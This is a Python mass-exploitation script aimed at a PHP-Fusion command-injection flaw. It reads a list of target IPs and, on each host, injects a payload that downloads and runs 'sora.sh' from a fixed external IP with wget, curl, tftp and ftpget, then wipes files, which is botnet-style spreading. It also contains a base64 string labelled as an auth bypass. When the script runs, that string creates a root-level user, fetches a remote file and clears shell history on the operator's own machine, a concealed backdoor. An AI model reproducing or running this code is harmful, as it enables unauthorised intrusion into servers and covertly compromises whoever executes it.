import base64
import sys
import threading
import requests
import os
import subprocess
from Queue import *
from threading import Thread

#Get argv1 and parse it to the Queue
ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
def php(cmd):
    subprocess.call(cmd, shell=True)

#Replace this with your payload
cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.0.10.182/sora.sh; curl -O http://37.0.10.182/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 37.0.10.182 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora.sh -g 37.0.10.182; chmod 777 sora.sh; sh sora.sh; ftpget -v -u anonymous -p anonymous -P 21 37.0.10.182 sora.sh sora.sh; sh sora.sh; rm -rf sora.sh; rm -rf *"


# Begin exploit config
PAYLOAD = "php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\""+cmd+"\");'  " # !!spaces are important in order to avoid ==!!
REQUEST_PAYLOAD = "/infusions/downloads/downloads.php?cat_id=$\{{system(base64_decode({})).exit\}}"
BASE64_AUTHBYPASS = "dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGJvYXQ7IGVjaG8gLWUgIjQyMDY5MTMzN1xuNDIwNjkxMzM3IiB8IHBhc3N3ZCBib2F0OyB3Z2V0IC1xIC0tbm8tY2hlY2stY2VydGlmaWNhdGUgLU8gL3RtcC8uLi4gaHR0cHM6Ly95aXAuc3UvMmtTeVk2OyBjbGVhcjsgaGlzdG9yeSAtYw=="
# End exploit config


# Encode payload to be ran on PHPFusion server
PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode('ascii')).decode("ascii").strip("=")
php(base64.b64decode(BASE64_AUTHBYPASS))

def phpfusion(host):
    print("[PHPFusion] Infected "+host)
    try:
        page_data = requests.get("http://" + host + "/infusions/downloads/downloads.php?cat_id=${system(ls)}")
        if "infusion_db.php" in page_data.text:
            requests.get(host + REQUEST_PAYLOAD.format(PAYLOAD_B64))
            print("[PHPFusion] Infected "+host)
    except:
        pass
    return


def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=phpfusion, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return

if __name__ == "__main__":
    main()
            